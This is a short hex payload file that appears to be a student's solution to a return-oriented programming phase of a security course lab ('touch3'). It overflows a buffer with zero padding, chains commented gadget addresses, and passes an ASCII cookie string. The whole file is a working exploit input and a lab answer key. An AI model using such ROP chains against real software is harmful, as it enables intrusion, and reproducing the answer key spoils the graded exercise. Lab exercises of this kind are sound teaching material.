
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
//pop  rax
cb 2c 40 00 00 00 00 00
20 00 00 00 00 00 00 00
//rax -> rdx
61 2d 40 00 00 00 00 00
//rdx -> rcx
75 2d 40 00 00 00 00 00
//rcx->esi
07 2d 40 00 00 00 00 00
//rsp -> rax
13 2d 40 00 00 00 00 00
//rax -> rdi
d9 2c 40 00 00 00 00 00
//add_xy
f1 2c 40 00 00 00 00 00
//rax -> rdi
d9 2c 40 00 00 00 00 00
//touch3 & cookie
23 2c 40 00 00 00 00 00 
31 63 32 61 33 32 34 35 00 